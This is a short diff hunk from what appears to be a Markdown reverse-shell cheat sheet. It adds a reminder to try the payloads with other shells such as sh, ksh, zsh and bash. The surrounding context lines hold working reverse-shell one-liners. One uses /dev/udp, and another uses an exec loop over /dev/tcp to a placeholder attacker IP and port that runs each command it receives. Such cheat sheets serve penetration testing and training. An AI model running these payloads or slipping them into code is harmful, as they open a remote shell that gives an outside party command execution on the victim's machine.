@@ -15,6 +15,8 @@ sh -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
 ```
 
+Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
+
 ### Symbol safe shell
 
 ```bash
